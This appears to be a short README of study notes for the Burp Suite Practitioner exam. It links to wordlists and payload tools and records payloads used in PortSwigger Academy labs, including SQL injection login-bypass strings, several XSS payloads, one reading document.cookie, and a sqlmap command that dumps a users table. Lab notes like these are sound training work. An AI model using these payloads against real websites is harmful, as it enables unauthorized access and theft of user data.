# Burp-Suite-Practitioner

## Useful Links:

1)https://portswigger.net/web-security/authentication/auth-lab-usernames ~ username wordlist

2)https://portswigger.net/web-security/authentication/auth-lab-passwords ~ password wordlist

3)https://github.com/frohoff/ysoserial ~ Java deserialization payload generator

4)https://github.com/PortSwigger/http-request-smuggler - HTTP request smuggler

5)https://portswigger.net/web-security/cross-site-scripting/cheat-sheet ~ PortSwigger XSS cheat sheet

6)https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md ~ XSS cheat sheet

7)https://portswigger.net/burp/documentation/desktop/tools/dom-invader/dom-xss ~ DOM XSS
## Labs

1)_SQL injection vulnerability in WHERE clause allowing retrieval of hidden data_
  
  Payload used:
  
  ' OR 1=1 --

2)_Reflected XSS into HTML context with nothing encoded_
  
  Payload used:
  
  <script>alert(1)</script>

3)_Stored XSS into HTML context with nothing encoded_
  
  Payload used:

  <script>alert(1)</script>

4)_DOM XSS in document.write sink using source location.search_
  
  Payload used:
  
  <img src=x onerror=alert(1)>
 
 5)_DOM XSS in innerHTML sink using source location.search_
 
  Payload used:
 
  <img src=x onerror=alert(1)>
  
 6)_DOM XSS in jQuery anchor href attribute sink using location.search source_
  
  Payload used:
 
  javascript:alert(document.cookie)
  
 7)_SQL injection UNION attack, retrieving data from other tables_
 
  Payload used:
  
  sqlmap -u https://0a6200cf04ebbed9c2d465d1009a00f2.web-security-academy.net/filter?category=* --batch -D public -T users --dump
  
 8)_SQL injection vulnerability allowing login bypass_
 
 Payload used:
 
 ' OR 1=1 --
 
 9)
